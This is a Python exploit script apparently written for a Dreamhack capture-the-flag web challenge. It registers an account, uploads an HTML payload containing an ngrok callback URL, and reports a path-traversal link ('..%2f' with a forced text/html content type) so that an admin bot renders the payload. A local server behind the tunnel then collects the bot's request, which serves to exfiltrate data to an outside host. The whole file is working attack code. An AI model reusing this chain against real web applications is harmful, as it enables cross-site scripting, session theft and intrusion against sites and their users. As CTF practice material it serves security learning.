import re
import requests
from bs4 import BeautifulSoup
import string
import random
from pyngrok import ngrok
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import threading
import queue
import re

TARGET_URL = 'http://host1.dreamhack.games:20133'
PORT = 8888
MSGLEN = 4096
q = queue.Queue()

class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        q.put(self.requestline)
        self.send_response(200)
        self.end_headers()
        message = "hax"
        self.wfile.write(message.encode('utf-8'))
        self.wfile.write('\n'.encode('utf-8'))
        return
    def log_message(self, format, *args):
        return


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


def init():
    server = ThreadedHTTPServer(('localhost', PORT), Handler)
    server.serve_forever()

    return server

def rand_string(N):
    res = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
    return res


def sign_up(uid, upw):
    data = {
        "uid": uid,
        "upw": upw
    }

    res = requests.post(f"{TARGET_URL}/signup", data=data)
    if(res.url == f"{TARGET_URL}/signup"):
        return False

    if(res.url == f"{TARGET_URL}/signin"):
        return True


def sign_in(uid, upw):
    data = {
        "uid": uid,
        "upw": upw
    }

    s = requests.Session()
    res = s.post(f"{TARGET_URL}/signin", data=data)
    if(res.url == f"{TARGET_URL}/signin"):
        return (None, False)

    if(res.url == f"{TARGET_URL}/user"):
        return (s, True)

    return (None, False)


def user(s):
    res = s.get(f"{TARGET_URL}/user")
    soup = BeautifulSoup(res.text, 'html.parser')

    table = soup.find('table')
    table_body = table.find('tbody')
    rows = table_body.find_all('tr')
    data = []
    for row in rows:
        cols = row.find_all('td')
        if(len(cols) == 2):
            cols[0] = cols[0].text.strip()
            cols[1] = cols[1].find('a').get('href')
        data.append([ele for ele in cols if ele])

    return data


def fileExists(filename, data):
    for col in data:
        if filename == col[0]:
            return True
    return False


def upload(s, filename, filedata, data):
    if fileExists(filename, data):
        filename = filename+rand_string(5)

    data = {
        "filename": filename,
        "data": filedata
    }

    res = s.post(f"{TARGET_URL}/user/upload", data=data)

    if(res.url == f"{TARGET_URL}/user"):
        return (filename, True)

    return (None, False)

def get_target():
    res = q.get()
    url = re.findall(r"GET /(.*) HTTP/1\.1",res)
    if len(url)>0:
        return url[0]
    else:
        return None

def findpath(file,data):
    for col in data:
        if col[0]==file:
            return col[1]

    return None

def report(s,file,data):
    path = findpath(file,data)[1:]
    path = f"/user/..%2f{path}?content-type=text/html"
    data = {
        "path": path
    }

    print(path)

    res = s.post(f"{TARGET_URL}/report",data=data)
    if "sucess" in res.text:
        return True
    else:
        return False

t = threading.Thread(target=init)
t.start()
tun = ngrok.connect(PORT)
uri = tun.public_url
sign_up('navyhk', 'navyhk')
s, err = sign_in('navyhk', 'navyhk')
data = user(s)

with open('exploit.html', 'r') as f:
    filedata = f.read()
    filedata = filedata.replace("{{url}}", uri)
    filename,err = upload(s,"exploit",filedata,data)
    print(filename)
    data = user(s)
    print(data)
    report(s,filename,data)

print(uri)
print(get_target())